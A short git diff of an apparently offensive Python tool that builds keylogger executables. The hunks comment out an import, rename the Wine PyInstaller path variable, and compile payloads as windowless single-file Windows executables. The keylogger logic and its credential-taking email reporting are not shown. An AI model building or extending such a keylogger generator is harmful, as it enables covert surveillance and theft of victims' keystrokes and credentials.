@@ -1,5 +1,4 @@
-#!/usr/bin/env python
-import argparse
+#import argparse
 import platform
 import subprocess
 import os
@@ -8,7 +7,7 @@ from pyfiglet import figlet_format
 from rich import print
 
 #==========================PATH FOR PYINSTALLER IN LINUX==========================
-WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
+Pyinstller_path = os.path.expanduser("/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
 
 #=====================Making Dictionary for command and tool===================
 available_commands = {
@@ -196,7 +195,7 @@ def create_keylogger_executable(file_name, interval, email, password):
 
 #==================================Compiling for Windows========================
 def compile_for_windows(file_name):
-    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])
+    subprocess.call(["wine", Pyinstller_path, "--onefile", "--noconsole", file_name])
 
 #=========================Compiling for Windows if the program is executed on Windows==================
 def compile_for_windows_in_windows(file_name):
